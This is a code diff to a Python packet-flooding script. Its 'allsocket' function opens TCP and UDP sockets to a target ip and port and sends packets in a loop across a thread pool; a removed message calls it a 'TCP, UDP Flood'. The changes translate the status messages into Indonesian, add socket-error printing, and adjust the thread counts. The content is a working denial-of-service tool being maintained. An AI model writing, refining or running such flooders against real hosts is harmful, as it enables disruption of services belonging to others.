@@ -72,7 +72,7 @@ def allsocket():
         tcp_socket.connect((ip, port))
         udp_socket.connect((ip, port))
 
-        print(f"Sending Packets to > ip : {ip} port : {port} | with time => {times} with Method TCP, UDP Flood ")
+        print(f"Mengirim paket ke > ip : {ip} port : {port}")
 
         # Send packets
         for _ in range(times):
@@ -82,14 +82,15 @@ def allsocket():
             tcp_socket.sendall(str.encode(request))
             udp_socket.sendto(grtools, (ip, port))
 
-        print(f"Sending Packets to > ip : {ip} port : {port} | with time => {times} with Method TCP, UDP Flood ")
+        print(f"Paket berhasil dikirim ke > ip : {ip} port : {port}")
     except socket.error as e:
         print(error.format(ip=ip, port=port))
+        print(f"Socket Error: {e}")
     finally:
         tcp_socket.close()
         udp_socket.close()
 
 # Run threads
-with concurrent.futures.ThreadPoolExecutor() as executor:
-    for _ in range(1000):
+with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    for _ in range(100):
         executor.submit(allsocket)
